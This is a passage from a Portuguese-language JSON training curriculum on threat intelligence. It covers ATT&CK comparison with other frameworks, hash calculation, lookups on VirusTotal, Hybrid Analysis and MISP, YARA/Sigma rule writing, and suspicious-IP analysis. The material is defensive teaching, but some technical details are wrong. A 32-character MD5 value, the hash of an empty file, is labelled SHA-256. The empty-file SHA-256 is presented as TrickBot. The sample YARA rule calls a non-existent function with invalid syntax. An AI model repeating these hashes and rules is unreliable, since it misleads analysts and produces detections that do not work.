                            "description": "Comparar cenários ATT&CK com outros modelos como Cyber Kill Chain ou Diamond Model para robustez, ajustando para ambientes de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar e Compreender Frameworks Complementares",
                                  "subSteps": [
                                    "Estude o Cyber Kill Chain: identifique as 7 fases (Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives).",
                                    "Analise o Diamond Model: entenda os quatro nós principais (Adversary, Infrastructure, Victim, Capability) e as relações entre eles.",
                                    "Compare superficialmente com MITRE ATT&CK para notar sobreposições e diferenças.",
                                    "Crie um glossário pessoal com definições chave de cada framework.",
                                    "Identifique como esses frameworks se aplicam a cenários de jogos cibernéticos simulados."
                                  ],
                                  "verification": "Resuma em um documento de 1 página as diferenças e semelhanças entre ATT&CK, Kill Chain e Diamond Model, com exemplos breves.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Documentação oficial MITRE ATT&CK",
                                    "Artigo Lockheed Martin Cyber Kill Chain",
                                    "Paper original do Diamond Model",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use diagramas visuais para mapear fases e nós; foque em analogias com jogos cibernéticos para facilitar retenção.",
                                  "learningObjective": "Compreender as estruturas e propósitos dos frameworks Cyber Kill Chain e Diamond Model em relação ao ATT&CK.",
                                  "commonMistakes": [
                                    "Confundir fases do Kill Chain com táticas do ATT&CK",
                                    "Ignorar as relações bidirecionais no Diamond Model",
                                    "Não considerar adaptações para simulações de jogos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Cenário ATT&CK para Frameworks Complementares",
                                  "subSteps": [
                                    "Selecione um cenário ATT&CK específico (ex: Initial Access via Phishing).",
                                    "Mapeie cada tático do ATT&CK para fases do Cyber Kill Chain.",
                                    "Crie um grafo do Diamond Model populando os nós com elementos do cenário ATT&CK.",
                                    "Documente sobreposições e gaps iniciais em uma tabela comparativa.",
                                    "Adapte o mapeamento para contexto de jogos cibernéticos, como turnos simulados."
                                  ],
                                  "verification": "Produza uma tabela ou diagrama de mapeamento com pelo menos 80% de cobertura entre frameworks.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Ferramenta de diagramação como Draw.io ou Lucidchart",
                                    "Cenário ATT&CK exemplo em JSON ou PDF",
                                    "Templates de mapeamento pré-prontos"
                                  ],
                                  "tips": "Use cores diferentes para cada framework no diagrama para visualização clara; comece com cenários simples antes de complexos.",
                                  "learningObjective": "Desenvolver habilidade de mapear táticas ATT&CK para estruturas de Kill Chain e Diamond Model.",
                                  "commonMistakes": [
                                    "Mapeamento unidirecional sem considerar feedback loops",
                                    "Omitir infraestrutura em cenários de jogos virtuais",
                                    "Sobrecarregar o mapa com detalhes desnecessários"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Robustez e Identificar Discrepâncias",
                                  "subSteps": [
                                    "Avalie cobertura: verifique se o cenário ATT&CK preenche todas as fases/nós dos outros frameworks.",
                                    "Identifique gaps: liste áreas não cobertas (ex: falta de C2 no Kill Chain).",
                                    "Pontue robustez em uma escala de 1-10 por framework, justificando.",
                                    "Considere impactos em jogos cibernéticos: simule como gaps afetam realismo da simulação.",
                                    "Priorize discrepâncias críticas para correção."
                                  ],
                                  "verification": "Gere um relatório de análise com lista de gaps, pontuações e impactos, totalizando 2-3 páginas.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Planilha Excel/Google Sheets para pontuação",
                                    "Cenário mapeado do Step 2",
                                    "Checklist de cobertura de frameworks"
                                  ],
                                  "tips": "Use matriz de cobertura para quantificar gaps; pense em 'o que falta para o cenário ser 'jogável'?'",
                                  "learningObjective": "Avaliar a robustez de cenários através de análise comparativa multi-framework.",
                                  "commonMistakes": [
                                    "Subestimar gaps em fases iniciais como Reconnaissance",
                                    "Ignorar viés de confirmação ao pontuar",
                                    "Não contextualizar para ambientes simulados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustar e Validar Cenário para Jogos Cibernéticos",
                                  "subSteps": [
                                    "Adicione elementos aos gaps identificados, alinhando com ATT&CK e outros frameworks.",
                                    "Simule o cenário ajustado em um ambiente de jogo cibernético virtual (ex: Cyber Range).",
                                    "Reavalie robustez pós-ajuste usando os mesmos critérios.",
                                    "Documente mudanças e valide com pares ou auto-checklist.",
                                    "Finalize o cenário validado com versão anotada."
                                  ],
                                  "verification": "Apresente o cenário ajustado com relatório de validação mostrando melhoria em robustez (ex: de 6/10 para 9/10).",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Plataforma de simulação como Cyber Range ou Rangeforce",
                                    "Ferramentas de versionamento como Git para cenários",
                                    "Checklist de validação final"
                                  ],
                                  "tips": "Teste em iterações curtas; envolva um colega para validação cruzada se possível.",
                                  "learningObjective": "Ajustar cenários para máxima robustez multi-framework em contextos de jogos cibernéticos.",
                                  "commonMistakes": [
                                    "Ajustes que criam novos gaps",
                                    "Não testar em simulação real",
                                    "Documentação insuficiente das mudanças"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético simulando um ataque de ransomware: mapeie táticas ATT&CK (T1566 Phishing) para Kill Chain (Delivery/Exploitation), identifique gap em Installation no Diamond Model (falta de Capability persistente), ajuste adicionando um dropper malware, valide simulando em um range onde o azul time detecta C2.",
                              "finalVerifications": [
                                "Cenário cobre 90%+ das fases do Cyber Kill Chain.",
                                "Todos os nós do Diamond Model estão populados e relacionados.",
                                "Robustez pontuada ≥8/10 em todos frameworks.",
                                "Ajustes documentados com before/after.",
                                "Simulação em jogo cibernético roda sem falhas lógicas.",
                                "Gaps resolvidos sem introduzir inconsistências ATT&CK."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento (sem erros factuais nos frameworks).",
                                "Profundidade da análise de gaps (identifica causas raiz).",
                                "Qualidade dos ajustes (aumenta robustez mensuravelmente).",
                                "Adequação ao contexto de jogos cibernéticos (realismo simulado).",
                                "Clareza da documentação e diagramas.",
                                "Criatividade em conexões interdisciplinares."
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Analogia com planejamento de operações (OODA Loop).",
                                "Análise de Dados: Uso de grafos para modelagem de relações (NetworkX).",
                                "Design de Jogos: Criação de cenários narrativos balanceados.",
                                "Gestão de Riscos: Avaliação quantitativa de vulnerabilidades."
                              ],
                              "realWorldApplication": "Em equipes de Red Team/Blue Team para planejamento de exercícios cibernéticos em organizações como agências de defesa ou empresas Fortune 500, garantindo cenários realistas e abrangentes que preparam defesas contra ameaças avançadas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.5",
                "name": "Indicadores de Compromisso e Comando e Controle Cibernético",
                "description": "Discute sinais de invasão bem-sucedida e mecanismos para manter o controle remoto em operações cibernéticas.",
                "totalSkills": 44,
                "atomicTopics": [
                  {
                    "id": "10.1.5.1",
                    "name": "Indicadores de Compromisso (IOCs)",
                    "description": "Sinais detectáveis de uma invasão bem-sucedida, como hashes maliciosos, IPs suspeitos e artefatos forenses.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.1.1",
                        "name": "Hashes Maliciosos",
                        "description": "Hashes criptográficos (como MD5, SHA-1, SHA-256) de arquivos ou binários maliciosos que servem como assinaturas digitais únicas para detectar malware conhecido em sistemas comprometidos.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.1.1",
                            "name": "Calcular hashes de arquivos suspeitos",
                            "description": "Utilizar ferramentas como sha256sum, PowerShell ou VirusTotal para gerar hashes MD5, SHA-1 e SHA-256 de arquivos potencialmente maliciosos e compará-los com bases de dados conhecidas de IOCs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Isolar o Arquivo Suspeito",
                                  "subSteps": [
                                    "Localize o arquivo suspeito em um ambiente isolado, como uma VM sandbox.",
                                    "Copie o arquivo para um diretório de análise seguro sem executá-lo.",
                                    "Registre metadados iniciais: nome, tamanho, data de criação e localização original.",
                                    "Verifique permissões e proprietário do arquivo usando comandos como ls -l (Linux) ou Get-Item (PowerShell).",
                                    "Crie um hash preliminar rápido para backup usando md5sum."
                                  ],
                                  "verification": "Confirme que o arquivo está isolado e metadados documentados em um relatório inicial.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Máquina virtual sandbox (ex: VirtualBox com snapshot)",
                                    "Diretório de análise seguro",
                                    "Bloco de notas ou ferramenta de documentação (ex: Markdown editor)"
                                  ],
                                  "tips": [
                                    "Sempre use snapshots de VM para reverter mudanças.",
                                    "Evite redes conectadas durante isolamento inicial.",
                                    "Nomeie cópias com timestamp para rastreabilidade."
                                  ],
                                  "learningObjective": "Entender a importância do isolamento para prevenir propagação de malware.",
                                  "commonMistakes": [
                                    "Executar o arquivo acidentalmente.",
                                    "Analisar em ambiente de produção.",
                                    "Ignorar metadados que podem indicar origem maliciosa."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular Hashes Usando Ferramentas Locais",
                                  "subSteps": [
                                    "No Linux/Mac: Use sha256sum arquivo.exe para SHA-256, md5sum para MD5, shasum -a 1 para SHA-1.",
                                    "No Windows PowerShell: Get-FileHash -Path arquivo.exe -Algorithm SHA256; repita para MD5 e SHA1.",
                                    "Salve os hashes em um arquivo texto: echo 'SHA256: hash_value' >> hashes.txt.",
                                    "Valide hashes cruzando com ferramenta online como VirusTotal (upload sem executar).",
                                    "Compare hashes locais com o relatório do VirusTotal."
                                  ],
                                  "verification": "Hashes gerados para MD5, SHA-1 e SHA-256 salvos e validados contra VirusTotal.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Terminal Linux/Mac ou PowerShell Windows",
                                    "Arquivo suspeito copiado",
                                    "Acesso a VirusTotal.com (conta gratuita)"
                                  ],
                                  "tips": [
                                    "Use -a para especificar algoritmo no shasum.",
                                    "Em PowerShell, pipe para Out-File para automação.",
                                    "Sempre compare múltiplos hashes para precisão."
                                  ],
                                  "learningObjective": "Dominar comandos para gerar hashes MD5, SHA-1 e SHA-256 em diferentes SOs.",
                                  "commonMistakes": [
                                    "Confundir algoritmos (ex: usar SHA-1 como SHA-256).",
                                    "Upload direto sem hash local primeiro.",
                                    "Ignorar discrepâncias entre ferramentas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Hashes com Bases de IOCs",
                                  "subSteps": [
                                    "Pesquise hashes em bases públicas: VirusTotal, Hybrid Analysis, MalwareBazaar.",
                                    "Use APIs ou buscas: vt intel.hashes('hash_value') no terminal com vt-cli.",
                                    "Verifique IOCs conhecidos: procure por detecções, nomes de malware associados.",
                                    "Analise resultados: número de AVs detectando, primeiros envios, tags.",
                                    "Documente matches: 'Hash SHA256:xxx corresponde a Emotet (detecção em 45/70 AVs)'."
                                  ],
                                  "verification": "Relatório com resultados de busca em pelo menos 3 bases IOCs, destacando matches.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Navegador web",
                                    "Ferramentas CLI como vt-cli ou hashdeep",
                                    "Lista de sites IOCs (VirusTotal, MalwareBazaar, etc.)"
                                  ],
                                  "tips": [
                                    "Priorize hashes SHA-256 por serem mais confiáveis.",
                                    "Use buscas exatas com aspas.",
                                    "Salve screenshots de resultados para evidência."
                                  ],
                                  "learningObjective": "Aprender a validar hashes contra IOCs para identificação de ameaças conhecidas.",
                                  "commonMistakes": [
                                    "Buscar apenas um hash/algoritmo.",
                                    "Ignorar falsos negativos em bases gratuitas.",
                                    "Não documentar fontes de IOCs."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar e Relatar Resultados",
                                  "subSteps": [
                                    "Compile relatório: hashes calculados, resultados IOCs, recomendações (quarentena, análise estática).",
                                    "Use template: Seção Hashes, Matches IOCs, Ações Sugeridas.",
                                    "Compartilhe via canal seguro (ex: encrypted email ou SIEM).",
                                    "Atualize base de IOCs locais se novo malware identificado.",
                                    "Teste reprodutibilidade recalculando hash em outra máquina."
                                  ],
                                  "verification": "Relatório completo gerado e compartilhado, com reprodutibilidade confirmada.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Editor de texto ou ferramenta de relatórios (ex: Obsidian, Word)",
                                    "Template de relatório IOC",
                                    "Canal de comunicação seguro"
                                  ],
                                  "tips": [
                                    "Inclua todos hashes e links para IOCs.",
                                    "Use markdown para formatação fácil.",
                                    "Sempre valide com colega para second opinion."
                                  ],
                                  "learningObjective": "Desenvolver habilidades de documentação para suporte a investigações.",
                                  "commonMistakes": [
                                    "Relatórios vagos sem hashes exatos.",
                                    "Compartilhar sem criptografia.",
                                    "Esquecer de testar reprodutibilidade."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma investigação de phishing, um usuário envia um anexo 'invoice.exe' suspeito. Isole em VM, calcule hashes (SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855), busque em VirusTotal (match com TrickBot), relate para quarentena imediata.",
                              "finalVerifications": [
                                "Hashes MD5, SHA-1 e SHA-256 calculados corretamente para o arquivo.",
                                "Busca realizada em pelo menos 3 bases IOCs com resultados documentados.",
                                "Relatório completo inclui hashes, matches e recomendações.",
                                "Reprodutibilidade confirmada recalculando em outra ferramenta.",
                                "Nenhum erro de execução do arquivo durante análise.",
                                "Documentação inclui metadados e fontes de IOCs."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos comandos de hash (100% match com valores esperados).",
                                "Cobertura completa de algoritmos (MD5, SHA-1, SHA-256).",
                                "Qualidade da comparação IOCs (múltiplas fontes, análise de resultados).",
                                "Relatório estruturado e acionável.",
                                "Tempo total dentro de 60-90 minutos.",
                                "Adesão a boas práticas de isolamento e segurança."
                              ],
                              "crossCurricularConnections": [
                                "Análise Forense Digital: Integra com extração de artefatos de memória.",
                                "Programação em PowerShell/Python: Automatizar cálculos de hash em scripts.",
                                "Redes e C2: Correlacionar hashes com IOCs de rede.",
                                "Ética em Cibersegurança: Privacidade ao lidar com hashes de dados sensíveis.",
                                "Gestão de Incidentes: Fluxo para relatórios em IR."
                              ],
                              "realWorldApplication": "Durante resposta a incidentes em SOCs, threat hunters usam hashes para triagem rápida de malware em e-mails phishing ou downloads drive-by, permitindo bloqueio proativo e atribuição de campanhas APT."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.2",
                            "name": "Verificar hashes em plataformas de threat intelligence",
                            "description": "Consultar hashes em serviços como VirusTotal, Hybrid Analysis ou MISP para determinar se correspondem a malware conhecido, analisando relatórios de detecção e comportamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Preparar o Hash Suspeito",
                                  "subSteps": [
                                    "Colete o hash do arquivo suspeito usando ferramentas como `sha256sum` no Linux, `Get-FileHash` no PowerShell ou `certutil -hashfile` no Windows.",
                                    "Identifique o tipo de hash (MD5, SHA-1, SHA-256) e priorize SHA-256 para precisão.",
                                    "Documente o contexto: origem da amostra, sintomas observados (ex: comportamento anômalo) e timestamp.",
                                    "Valide o formato do hash (ex: 64 caracteres hex para SHA-256) e remova espaços ou erros de cópia.",
                                    "Crie um documento de referência com o hash e contexto para análises subsequentes."
                                  ],
                                  "verification": "Hash formatado corretamente, tipo identificado e contexto documentado em arquivo de notas verificável.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramentas de hash (sha256sum, Get-FileHash, certutil)",
                                    "Editor de texto ou bloco de notas"
                                  ],
                                  "tips": "Sempre prefira SHA-256; MD5/SHA-1 são obsoletos devido a colisões conhecidas. Copie hashes diretamente para evitar erros manuais.",
                                  "learningObjective": "Gerar, validar e contextualizar hashes para investigação eficiente de threat intelligence.",
                                  "commonMistakes": [
                                    "Usar hash incorreto ou incompleto.",
                                    "Ignorar contexto da amostra.",
                                    "Confundir tipos de hash."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Consultar VirusTotal para Análise Inicial",
                                  "subSteps": [
                                    "Acesse https://www.virustotal.com/gui/home/search no navegador.",
                                    "Cole o hash na barra de pesquisa e execute a busca.",
                                    "Revise abas principais: 'Detection' (engines AV positivas), 'Details' (metadados), 'Behavior' (sandbox).",
                                    "Anote métricas: número de detecções, prevalência, harmless/malicious ratio e data da última análise.",
                                    "Baixe relatório JSON/PDF se necessário para evidências."
                                  ],
                                  "verification": "Relatório VirusTotal acessado, métricas principais anotadas e comparadas com threshold de suspeita (ex: >5 detecções).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Navegador web moderno",
                                    "Conta VirusTotal gratuita (opcional para API/quota maior)"
                                  ],
                                  "tips": "Filtre por engines confiáveis (ex: Microsoft, Kaspersky); cheque 'Relations' para hashes similares ou campanhas.",
                                  "learningObjective": "Navegar e interpretar resultados multifacetados do VirusTotal para triagem rápida.",
                                  "commonMistakes": [
                                    "Interpretar detecções baixas como benigno sem contexto.",
                                    "Ignorar análises antigas (>6 meses).",
                                    "Não checar comportamento em sandbox."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Validar em Hybrid Analysis para Comportamento Detalhado",
                                  "subSteps": [
                                    "Acesse https://www.hybrid-analysis.com e insira o hash na caixa de busca.",
                                    "Examine verdict geral (malicious/benign) e seções de sandbox: processos, rede, arquivos dropados.",
                                    "Identifique IOCs extras: URLs, IPs, registry keys associados.",
                                    "Compare resultados com VirusTotal, notando discrepâncias.",
                                    "Capture screenshots ou exporte relatório para documentação."
                                  ],
                                  "verification": "Relatório Hybrid Analysis revisado, IOCs listados e comparados com VirusTotal.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Navegador web"
                                  ],
                                  "tips": "Foco na aba 'Behavior'; Hybrid é excelente para dinâmicas que VT pode não mostrar em detalhes.",
                                  "learningObjective": "Usar Hybrid Analysis para validação comportamental cruzada de hashes.",
                                  "commonMistakes": [
                                    "Não verificar se análise é recente.",
                                    "Ignorar IOCs secundários.",
                                    "Sobrepor confiança sem comparação."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Consultar MISP e Sintetizar Resultados Finais",
                                  "subSteps": [
                                    "Acesse instância MISP (ex: https://www.misp-project.org/demo ou instância organizacional).",
                                    "Busque pelo hash em 'Search' ou 'Event' view.",
                                    "Analise atributos: tags (ex: 'malware=emotet'), galáxias de threat actor, objetos relacionados.",
                                    "Sintetize achados de todas plataformas: confiança (alta/média/baixa), verdict unificado e ações (quarentena, bloquear).",
                                    "Gere relatório final com evidências, citações e recomendações."
                                  ],
                                  "verification": "Relatório sintetizado com verdict claro, fontes citadas e ações recomendadas documentadas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso MISP (demo ou privado)",
                                    "Ferramenta de documentação (ex: Markdown, Word)"
                                  ],
                                  "tips": "MISP destaca IOCs em campanhas; use filtros por tag/org para ruído baixo.",
                                  "learningObjective": "Integrar threat intel de múltiplas fontes para decisão informada.",
                                  "commonMistakes": [
                                    "Basear em fonte única.",
                                    "Não citar evidências.",
                                    "Concluir falsos positivos como ameaça."
                                  ]
                                }
                              ],
                              "practicalExample": "Durante uma investigação de phishing, um arquivo .exe com hash SHA-256 'd41d8cd98f00b204e9800998ecf8427e' é isolado. Verifique no VirusTotal (20/70 detecções), Hybrid Analysis (comportamento C2 para Cobalt Strike) e MISP (tag 'ta-toolkit=2023'), concluindo como payload malicioso e recomendando bloqueio via EDR.",
                              "finalVerifications": [
                                "Hash consultado em pelo menos três plataformas com resultados documentados.",
                                "Relatórios analisados: detecções AV, comportamento sandbox e IOCs associados.",
                                "Verdict unificado com nível de confiança justificado.",
                                "Ações recomendadas baseadas em evidências (ex: quarentena, YARA rule).",
                                "Sem discrepâncias não resolvidas entre fontes.",
                                "Relatório final completo e exportável."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de relatórios (>90% alinhado com consensos).",
                                "Cobertura completa de plataformas (VT, HA, MISP).",
                                "Análise crítica de falsos positivos e contexto.",
                                "Documentação organizada com métricas, screenshots e citações.",
                                "Eficiência temporal (dentro de 70 minutos totais).",
                                "Recomendações acionáveis e realistas."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Interpretação de métricas, gráficos e correlações em relatórios.",
                                "Programação: Automatização via APIs (VirusTotal, MISP REST API) com Python/requests.",
                                "Redes: Análise de tráfego C2, IPs e domínios em IOCs.",
                                "Ética e Direito: Conformidade com privacidade ao compartilhar IOCs (GDPR, sharing policies).",
                                "Gestão de Projetos: Documentação para relatórios de incidente (SIR)."
                              ],
                              "realWorldApplication": "Em um centro de operações de segurança (SOC), verificar hashes durante resposta a incidentes permite identificar malware conhecido rapidamente, bloquear C2 communications e mitigar breaches em ambientes corporativos, economizando horas de análise manual."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.3",
                            "name": "Integrar hashes em regras de detecção",
                            "description": "Configurar hashes em ferramentas como YARA ou Sigma para criar regras de detecção automatizadas em endpoints e SIEMs, simulando identificação de persistência adversária.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coletar e Validar Hashes Maliciosos",
                                  "subSteps": [
                                    "Pesquise fontes confiáveis como VirusTotal, MalwareBazaar ou MITRE ATT&CK para hashes conhecidos de malware (ex: SHA256 de um trojan persistente).",
                                    "Copie hashes em formatos MD5, SHA1 e SHA256, garantindo que sejam de arquivos maliciosos confirmados.",
                                    "Valide a integridade do hash usando ferramentas como hashcalc ou PowerShell (Get-FileHash).",
                                    "Documente o contexto do hash: nome do malware, táticas (ex: T1543 Persistence) e IOCs associados.",
                                    "Armazene hashes em um arquivo texto ou JSON para uso posterior."
                                  ],
                                  "verification": "Verifique se possui pelo menos 3 hashes válidos com contexto documentado e hashes calculados localmente coincidem com fontes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Acesso à internet (VirusTotal, MalwareBazaar)",
                                    "Calculadora de hash (PowerShell ou online tool)",
                                    "Editor de texto (Notepad++)"
                                  ],
                                  "tips": "Sempre priorize hashes de amostras recentes e evite hashes genéricos; use APIs gratuitas para automação futura.",
                                  "learningObjective": "Identificar e validar hashes de IOCs maliciosos de fontes confiáveis.",
                                  "commonMistakes": [
                                    "Confundir hashes benignos com maliciosos",
                                    "Copiar hashes incompletos ou corrompidos",
                                    "Ignorar validação cruzada entre fontes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Sintaxe de Regras YARA e Sigma para Hashes",
                                  "subSteps": [
                                    "Leia documentação oficial de YARA (yara.readthedocs.io) focando em módulos de hash ($md5, $sha1, $sha256).",
                                    "Analise exemplos de regras YARA que usam hashes para detecção de persistência (ex: regras do YARA Rules repo no GitHub).",
                                    "Estude sintaxe Sigma (sigmahq.io): campos como 'hash.md5', 'hash.sha256' em YAML para SIEMs.",
                                    "Compare YARA (para endpoints) vs Sigma (para SIEMs/log): YARA é binário, Sigma é evento-based.",
                                    "Pratique parsing manual de uma regra exemplo para entender placeholders de hash."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito a diferença entre $hex em YARA e hash.sha256 em Sigma, com exemplos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação YARA/Sigma online",
                                    "Repositórios GitHub (Neo23x0/signature-base, SigmaHQ/sigma)",
                                    "Navegador web"
                                  ],
                                  "tips": "Use editores com syntax highlighting para YAML/ YARA; memorize que hashes em YARA usam aspas duplas para hex.",
                                  "learningObjective": "Dominar sintaxe específica de hashes em YARA e Sigma para regras de detecção.",
                                  "commonMistakes": [
                                    "Misturar formatos de hash (ex: usar MD5 em campo SHA256)",
                                    "Esquecer de escapar caracteres especiais em regras",
                                    "Confundir YARA com regex genérica"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Regras de Detecção com Hashes",
                                  "subSteps": [
                                    "Escreva uma regra YARA básica: inclua meta (autor, data, threat), strings ($hash = \"[SHA256 aqui]\"), condition (filesize e hash match).",
                                    "Crie uma regra Sigma equivalente: title, detection (selection com hash.md5/sha256), condition (all of them).",
                                    "Incorpore lógica para persistência: combine hash com paths como %APPDATA% ou registry keys.",
                                    "Valide sintaxe usando yara -C rule.yar ou sigma convert tool.",
                                    "Teste dry-run: scan um arquivo dummy com hash alterado."
                                  ],
                                  "verification": "Compile e valide sem erros as duas regras (YARA e Sigma) usando ferramentas oficiais.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Editor de código (VS Code com extensões YARA/Sigma)",
                                    "YARA binary instalado",
                                    "Sigma CLI tool"
                                  ],
                                  "tips": "Comece com uma regra simples e itere; use variáveis para múltiplos hashes (pe.exact_hashes).",
                                  "learningObjective": "Construir regras funcionais YARA e Sigma integrando hashes para detecção automatizada.",
                                  "commonMistakes": [
                                    "Regras muito amplas causando falsos positivos",
                                    "Erros de indentação em YAML Sigma",
                                    "Hashes em minúsculas vs maiúsculas inconsistentes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Integrar Regras em Ambientes Simulados",
                                  "subSteps": [
                                    "Instale YARA em endpoint simulado (VM Windows/Linux) e escaneie amostra com hash correspondente.",
                                    "Converta Sigma para SIEM simulado (ex: Splunk free ou ELK stack local) usando sigma-cli e teste alertas.",
                                    "Simule persistência: baixe amostra segura (EICAR-like com hash custom) e verifique detecção.",
                                    "Monitore logs: confirme alertas em endpoints/SIEM com IOCs de persistência.",
                                    "Ajuste regras baseadas em resultados (thresholds, exclusions)."
                                  ],
                                  "verification": "Execute scan/detecção bem-sucedida com log de alerta confirmando match de hash e contexto de persistência.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "VM para teste (VirtualBox)",
                                    "YARA/Sigma tools instalados",
                                    "SIEM simulado (Splunk free trial ou Logstash)",
                                    "Amostras seguras (VirusShare hashes testados)"
                                  ],
                                  "tips": "Use amostras não-maliciosas primeiro; isole VM para segurança; automatize com scripts de deploy.",
                                  "learningObjective": "Deploy e validar regras em cenários simulados de endpoint e SIEM.",
                                  "commonMistakes": [
                                    "Executar amostras reais sem sandbox",
                                    "Ignorar permissões de scan em endpoints",
                                    "Não testar falsos negativos com hashes similares"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma regra YARA para detectar o hash SHA256 'd41d8cd98f00b204e9800998ecf8427e' de um loader persistente: rule PersistLoader { meta: description = \"Detecta loader via hash\"; strings: $sha256 = \"d41d8cd98f00b204e9800998ecf8427e\"; condition: pe.exact_hashes($sha256) and filesize < 1MB }. Teste escaneando um exe com esse hash em uma VM, simulando detecção em endpoint de SOC.",
                              "finalVerifications": [
                                "Regras YARA e Sigma compilam sem erros e detectam hashes corretos.",
                                "Testes em VM/SIEM geram alertas com contexto de persistência adversária.",
                                "Hashes são validados de múltiplas fontes e documentados.",
                                "Regras incluem meta-dados e condições para reduzir falsos positivos.",
                                "Você pode explicar o fluxo de detecção em 2 minutos.",
                                "Adaptação rápida para novo hash leva <5 minutos."
                              ],
                              "assessmentCriteria": [
                                "Precisão: 100% de detecção de hashes alvo sem falsos positivos em testes.",
                                "Completude: Todas regras têm meta, strings, conditions e validação.",
                                "Eficiência: Tempo de scan <10s por arquivo; regras otimizadas.",
                                "Documentação: Contexto IOCs e logs de teste claros.",
                                "Adaptabilidade: Modificação para Sigma/YARA alternados funciona.",
                                "Segurança: Nenhum risco em ambiente simulado."
                              ],
                              "crossCurricularConnections": [
                                "Análise Forense Digital: Extração de hashes de memória/disco.",
                                "Programação em Python: Automatizar geração de regras via scripts.",
                                "Inteligência de Ameaças: Mapeamento MITRE ATT&CK T1543.",
                                "Redes e SIEM: Integração com ELK/Splunk para C2 detection.",
                                "Ética em Cibersegurança: Manejo seguro de IOCs maliciosos."
                              ],
                              "realWorldApplication": "Em um SOC, analistas integram hashes de campanhas como Emotet em YARA para EDR (ex: CrowdStrike) e Sigma para Splunk, detectando persistência em endpoints de enterprise, permitindo resposta rápida a IOCs de threat actors como APT29."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.5.1.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.1.2",
                        "name": "Endereços IP e Domínios Suspeitos",
                        "description": "Endereços IP, domínios ou URLs associados a infraestrutura de comando e controle (C2) ou usados em comunicações maliciosas, identificáveis por tráfego anômalo ou listas de bloqueio.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.2.1",
                            "name": "Identificar IPs suspeitos em logs de rede",
                            "description": "Analisar logs de firewall, proxy ou Wireshark para extrair IPs com tráfego para portas incomuns (ex: 4444 para Metasploit) e verificá-los em bases como AbuseIPDB ou ThreatFox.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e obter logs de rede",
                                  "subSteps": [
                                    "Instale ou abra ferramentas de análise como Wireshark, grep (para logs de texto) ou ELK Stack se disponível.",
                                    "Acesse logs relevantes: firewall (ex: /var/log/firewall.log), proxy (ex: Squid logs) ou capture de pacotes via Wireshark.",
                                    "Selecione um período de tempo suspeito (ex: últimas 24h) e exporte ou copie os logs para um arquivo local.",
                                    "Organize o workspace: crie uma pasta dedicada com subpastas para logs raw, análise e relatórios.",
                                    "Faça backup dos logs originais para evitar perda de dados."
                                  ],
